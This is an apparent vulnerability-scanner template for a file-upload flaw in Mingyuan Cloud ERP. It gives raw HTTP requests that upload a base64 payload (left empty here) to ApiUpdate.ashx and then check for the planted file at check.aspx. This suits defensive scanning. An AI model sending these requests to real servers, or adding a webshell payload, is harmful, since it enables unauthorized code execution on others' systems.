id: mingyuan-erp-file-upload
info:
  name: Mingyuan Cloud ERP ApiUpdate.ashx File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Mingyuan Cloud ERP contains a file upload vulnerability that allows attackers to upload malicious files, execute code on the server, and take full control of the web server.
  reference:
    - http://www.myunke.com/
  tags: file-upload

variables:
  payload_encoded: ""

http:
  - raw:
      - |
          POST /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/x-www-form-urlencoded

          {{base64_decode(payload_encoded)}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 500
      - type: word
        part: body
        words:
          - "cc4041b9"

  - raw:
      - |
          GET /fdccloud/_/check.aspx HTTP/1.1
          Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 500
      - type: word
        part: body
        words:
          - "cc4041b9"
